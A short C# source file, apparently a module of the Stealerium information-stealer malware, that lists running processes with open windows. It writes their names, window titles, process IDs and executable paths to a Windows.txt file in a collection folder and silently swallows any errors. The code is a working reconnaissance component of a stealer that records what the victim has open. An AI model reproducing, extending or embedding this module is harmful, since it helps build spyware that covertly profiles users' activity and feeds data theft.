using System.Diagnostics;
using System.IO;

namespace Stealerium.Target.System
{
    internal sealed class ActiveWindows
    {
        public static void WriteWindows(string sSavePath)
        {
            var processlist = Process.GetProcesses();
            foreach (var process in processlist)
                try
                {
                    if (!string.IsNullOrEmpty(process.MainWindowTitle))
                        File.AppendAllText(
                            sSavePath + "\\Windows.txt",
                            "NAME: " + process.ProcessName +
                            "\n\tTITLE: " + process.MainWindowTitle +
                            "\n\tPID: " + process.Id +
                            "\n\tEXE: " + ProcessList.ProcessExecutablePath(process) +
                            "\n\n"
                        );
                }
                catch
                {
                    // ignored
                }
        }
    }
}